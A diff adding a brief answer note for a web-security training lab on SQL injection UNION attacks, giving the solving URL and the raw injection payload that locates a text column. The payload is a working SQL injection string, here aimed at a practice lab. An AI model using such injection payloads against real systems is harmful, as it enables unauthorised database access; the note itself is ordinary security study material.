@@ -1,0 +1,5 @@
+Lab: SQL injection UNION attack, finding a column containing text
+
+Answer: https://0a9a007804fed2fa83f192a600bf00d0.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,%27G8FX8r%27,NULL--
+
+'+UNION+SELECT+NULL,'G8FX8r',NULL
